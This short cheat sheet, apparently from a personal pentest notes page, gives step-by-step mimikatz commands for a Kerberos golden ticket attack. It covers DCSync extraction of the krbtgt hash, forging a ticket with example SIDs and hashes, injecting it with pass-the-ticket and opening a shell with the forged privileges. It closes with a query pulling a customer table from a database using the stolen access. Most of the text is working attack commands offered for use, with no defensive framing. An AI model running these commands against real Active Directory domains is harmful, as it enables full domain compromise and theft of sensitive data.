
start mimikatz.exe on a windows machine and you get a prompt

`mimikatz # `

to get the krbtgt accounts hash (and other info):  (this requires dcsync permissions)
`lsadump::dcsync /domain:mydomain.com /user:krbtgt`

(or at the ps prompt: `mimikatz.exe "lsadump::dcsync /user:DOMAIN\KRBTGT"`)

to get a golden ticket (500 = administrator):
`kerberos::golden /domain:mydomain.com /sid:S-1-1-12-1234567890-1234567890-1234567890 /rc4:0e2eb8158c27bed09861033026be4c21 /id:500 /user:WhateverNameYouWant`
This will save a ticket file `ticket.kirbi`
This ticket is valid for a long time

<font color=yellow>OBS! any name was patched nov 2021 so a valid user must be used!</font>

pass a ticket - load it into memory with:
`kerberos::ptt ticket.kirbi`

use the ticket by opening a cmd with:
`misc::cmd`
whoami will still say you're using the old account but you have the access of the ticket

---

not using the mimikatz cli

`PS> mimikatz.exe "lsadump::dcsync /user:DOMAIN\KRBTGT"`

`PS> mimikatz.exe "kerberos::golden /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /aes256:ffa8bd983a5a03618bdf577c2d79a467265f140ba339b89cc0a9c1bfdb4747f5 /user:NonExistentUser /groups:513,2668 /ptt"`

- `/domain` — The FQDN of the domain
- `/sid` — The SID of the domain
- `/aes256` — The AES-256 password hash of the `KRBTGT` user (alternatively, `/ntlm` or `/rc4` can be used for NTLM hashes, and `/aes128` for AES-128)
- `/user` — The username to be impersonated
- `/groups` — The list of groups (by RID) to include in the ticket, with the first being the user’s primary group
- `/ptt` — Indicates that the forged ticket should be injected into the current session instead of being written to a file

now use this shell to start "anything"
`PS> mssql-cli --server dbserver --integrated --query 'SELECT SYSTEM_USER; SELECT * FROM [SensitiveApp].[dbo].[Customers]'`


### Help

```sh
add!
```
